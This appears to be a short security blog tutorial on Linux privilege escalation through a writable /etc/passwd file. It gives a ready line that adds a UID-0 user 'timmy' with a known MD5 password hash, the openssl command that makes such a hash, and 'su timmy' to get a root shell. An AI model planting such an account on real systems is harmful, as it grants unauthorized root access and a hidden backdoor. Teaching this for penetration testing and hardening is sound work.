---
layout: single
title:  "Getting Root via /etc/passwd file"
author_profile: true
toc: true
toc_label: "Table of Contents"
toc_icon: "fas fa-book-open"
toc_sticky: true
future: true
header:
    image: https://static1.squarespace.com/static/5a01100f692ebe0459a1859f/t/5f9123d2b807353e905b4fe6/1603347440376/BSY+Security+Class+Diagrams+-+_etc_passwd+%28L%29.jpg?format=1500w
    caption: "Photo by [**Trystan**](https://www.stratosphereips.org/blog/2020/10/22/a-visual-display-of-etcpasswd-andetcshadow) on [**Stratosphere Lab**](https://www.stratosphereips.org)"
    teaser: https://images.unsplash.com/photo-1633265486064-086b219458ec?q=80&w=2670&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
---

> The /etc/passwd file is a file we should check whenever we gain access into a system. A simple misconfiguration with the file permission can enable us to become root.

In this article, we going to explore a privilege escalation technique which allows us to gain the authority of root.

In order to perform this technique, we need to have write permission enabled for us as a user, to be able to modify the /etc/passwd file.

To recap on file system, please refer to the image below:

![File system](https://linuxcommand.org/images/file_permissions.png)

The permission for others can be seen at the 3rd set of rwx.

Let us try to open up the file with vim and add this line of command at the end of the file:

```
timmy:$1$WQHndChN$HkQUXIR5njLbQQyz/VSA8.:0:0:timmy:/root:/bin/bash
```
The long hash of password is derived from our password t1mmy (1 replaced i) via the command:
```
openssl passwd -1
```

> Openssl is a cryptography and ssl toolkit, and the command above uses the MD5 based BSD password algorithm 1.

Once we've updated our /etc/passwd with the line of command, let us save our file.

Next, we can simply just

```
su timmy
```

and type in our password which is t1mmy, and we will be returned with a root shell.

\
Thank you for reading!